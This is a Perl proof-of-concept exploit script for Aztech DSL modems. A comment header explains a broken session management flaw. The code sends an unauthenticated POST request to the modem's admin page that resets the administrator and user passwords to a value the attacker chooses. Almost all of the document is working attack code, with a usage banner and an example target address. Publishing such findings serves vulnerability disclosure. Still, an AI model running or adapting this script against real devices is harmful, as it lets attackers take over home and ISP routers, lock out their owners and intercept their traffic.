#!/usr/bin/perl
# Title: Aztech Modem Broken Session Management Exploit
# Author: Eric Fajardo - fjpfajardo@ph.ibm.com 
#
# A successful authentication of a privilege (admin) ID in the
# web portal allows any attacker in the network to hijack and
# reuse the existing session in order to trick and allow the web
# server to execute administrative commands. The command may be
# freely executed from any terminal in the network as long as
# the session of the privilege ID is valid. The below PoC shows 
# an un-authenticated request to the web server for an administrator 
# and user password reset.
#
# This exploit was tested working with the following modems:
# - DSL5018EN(1T1R) from Globe Telecom
# - DSL705E
# - DSL705EU

use strict;
use IO::Socket;

if(!defined($ARGV[0])) {
system ('clear');
print "---------------------------------------------\n";
print "++ Aztech Modem Broken Session Management Exploit\n";
print "++ Usage: perl $0 TARGET:PORT NEWPASSWORD\n";
print "++ Ex: perl $0 192.168.254.254:80 h4rh4rHaR\n\n";
exit;
}

my $TARGET = $ARGV[0];
my $NEWPASS = $ARGV[1];
my ($HOST, $PORT)= split(':',$TARGET);
my $PATH = "/cgi-bin/admAccess.asp";

system ('clear');
print "---------------------------------------------\n";
print "++ Sending POST string to $TARGET ...\n";

my $PAYLOAD = "saveFlag=1&adminFlag=1&SaveBtn=SAVE&uiViewTools_Password=$NEWPASS&uiViewTools_PasswordConfirm=$NEWPASS&uiViewTools_Password1=$NEWPASS&uiViewTools_PasswordConfirm1=$NEWPASS";
my $POST = "POST $PATH HTTP/1.1";

my $ACCEPT = "Accept: text/html, application/xhtml+xml, */*";
my $REFERER = "Referer: http://$HOST/cgi-bin/admAccess.asp";
my $LANG = "Accept-Language: en-US";
my $AGENT = "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25";
my $CONTYPE = "Content-Type: application/x-www-form-urlencoded";
my $ACENCODING = "Accept-Encoding: gzip, deflate";
my $PROXYCONN = "Proxy-Connection: Keep-Alive";
my $CONNLENGTH = "Content-Length: 179";
my $DNT = "DNT: 1";
my $TARGETHOST = "Host: $HOST";
my $PRAGMA = "Pragma: no-cache";

my $sock = new IO::Socket::INET ( PeerAddr => "$HOST",PeerPort => "$PORT",Proto => "tcp"); die "[-] Can't creat socket: $!\n" unless $sock;

print $sock "$POST\n";
print $sock "$ACCEPT\n";
print $sock "$REFERER\n";
print $sock "$LANG\n";
print $sock "$AGENT\n";
print $sock "$CONTYPE\n";
print $sock "$ACENCODING\n";
print $sock "$PROXYCONN\n";
print $sock "$CONNLENGTH\n";
print $sock "$DNT\n";
print $sock "$TARGETHOST\n";
print $sock "$PRAGMA\n\n";
print $sock "$PAYLOAD\n";

print "++ Sent. Connect to the web URL http://$HOST with user:admin password:$NEWPASS\n";
$sock->close();
exit;


